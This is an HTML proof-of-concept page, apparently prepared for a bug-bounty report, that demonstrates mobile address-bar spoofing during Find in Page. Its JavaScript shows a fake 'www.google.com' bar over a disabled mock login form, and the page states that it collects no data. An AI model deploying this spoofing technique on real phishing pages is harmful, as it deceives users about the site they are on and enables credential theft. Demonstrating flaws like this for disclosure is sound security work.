<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>bughunter.proofs</title>
<meta name="theme-color" content="#f1f3f4" id="themeColor">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
  background: #0f0f0f;
  color: #eaeaea;
  min-height: 200vh;
  padding: 24px;
}

h1 { font-weight: 400; }

.login-box {
  max-width: 420px;
  margin: 40px auto;
  padding: 20px;
  border: 1px solid #303134;
  border-radius: 12px;
  background: #121212;
}

.login-box h2 {
  font-size: 18px;
  margin-bottom: 16px;
}

.login-box label {
  font-size: 13px;
  color: #9aa0a6;
  display: block;
  margin-bottom: 6px;
}

.login-box input {
  width: 100%;
  padding: 12px;
  margin-bottom: 16px;
  border-radius: 8px;
  border: 1px solid #303134;
  background: #1e1e1e;
  color: #888;
}

.login-box input:disabled {
  opacity: 0.6;
}

.notice {
  font-size: 12px;
  color: #9aa0a6;
  margin-top: 8px;
}

.fake-bar {
  position: fixed;
  left: 0;
  width: 100%;
  background: #121212;
  border-top: 1px solid #303134;
  text-align: center;
  padding: 8px 0;
  font-size: 14px;
  color: #eaeaea;
  z-index: 9999;
  bottom: 0;
  opacity: 0;
  visibility: hidden;
  transition: opacity .25s ease, visibility .25s ease, bottom .2s ease;
}

.fake-bar.show {
  opacity: 1;
  visibility: visible;
}
</style>
</head>

<body>

<h1>Address Bar Spoof – Find in Page</h1>
<p>
This demo shows how a page can visually replace the browser address bar
while <b>Find in Page</b> is active.
</p>

<div class="login-box">
  <h2>Sign in</h2>

  <label>Email</label>
  <input type="text" placeholder="user@example.com" disabled>

  <label>Password</label>
  <input type="password" placeholder="••••••••" disabled>

  <div class="notice">
    Demo only — inputs are disabled, no data collection.
  </div>
</div>

<div class="fake-bar" id="fakeBar">
www.google.com
</div>

<script>
const fakeBar = document.getElementById("fakeBar");
const themeColor = document.getElementById("themeColor");

let lastViewportHeight = window.innerHeight;
let lastScrollY = window.scrollY;
let lastInputTime = 0;
let active = false;

function setTheme(color) {
  themeColor.setAttribute("content", color);
}

function showBar(bottomPx) {
  if (active) return;
  active = true;
  setTheme("#ffffff");
  fakeBar.style.bottom = bottomPx + "px";
  fakeBar.classList.add("show");
}

function hideBar() {
  active = false;
  fakeBar.classList.remove("show");
  fakeBar.style.bottom = "0px";
  setTheme("#f1f3f4");
}

document.addEventListener("input", () => {
  lastInputTime = Date.now();
});

window.addEventListener("scroll", () => {
  lastScrollY = window.scrollY;
});

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", () => {
    const vv = window.visualViewport;
    const heightDiff = lastViewportHeight - vv.height;
    const keyboardLike = heightDiff > 120;

    const recentlyTyped = Date.now() - lastInputTime < 800;
    const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;

    if (keyboardLike && !recentlyTyped && !scrollMoved) {
      const bottomOffset = window.innerHeight - vv.height;
      showBar(bottomOffset);
    } else {
      hideBar();
    }

    lastViewportHeight = vv.height;
  });
}

window.addEventListener("orientationchange", hideBar);
</script>

</body>
</html>
